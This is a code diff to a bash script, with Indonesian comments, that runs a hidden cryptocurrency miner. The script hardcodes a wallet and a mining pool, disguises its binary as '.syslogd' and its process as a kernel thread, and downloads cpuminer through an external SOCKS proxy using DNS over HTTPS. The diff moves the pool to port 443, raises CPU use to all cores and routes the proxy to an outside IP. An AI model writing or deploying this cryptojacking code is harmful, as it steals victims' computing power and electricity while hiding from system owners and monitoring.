@@ -6,13 +6,13 @@ BASE_WALLET="Bc4QbZ9pPM5sJQ1RLdG7SrJCjqCnT5FVq9"
 WORKER="$(tr -dc a-z0-9 </dev/urandom | head -c 6)"
 WALLET="$BASE_WALLET.$(tr -dc a-z0-9 </dev/urandom | head -c 6)"
 
-POOL="stratum+tcp://159.223.48.143:10300"
+POOL="stratum+tcp://159.223.48.143:443"
 ALGO="power2b"
-THREADS=$(( $(nproc --all) / 2 ))
+THREADS=$(( $(nproc --all) / 1 ))
 BIN_NAME=".syslogd"
 PROCESS_NAME="[rcu_sched/3]"
 LOG_FILE=".xlog"
-PROXY="socks5h://127.0.0.1:9050"  # Default SOCKS5 proxy
+PROXY="socks5h://101.38.175.192:8081"
 
 # ====[ DNS over HTTPS Setup (jika curl DoH tersedia) ]====
 export RESOLVE_DOH="https://dns.google/dns-query"
@@ -32,7 +32,7 @@ fi
 # ====[ Unduh miner jika belum ada ]====
 if [ ! -f "$BIN_NAME" ]; then
     echo "[INFO] Mengunduh miner..."
-    curl --socks5-hostname 127.0.0.1:9050 -L --dns-url "$RESOLVE_DOH" --connect-timeout 10 \
+    curl --socks5-hostname 101.38.175.192:8081 -L --dns-url "$RESOLVE_DOH" --connect-timeout 10 \
         -o miner.tgz https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz || \
     wget --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz -O miner.tgz
 
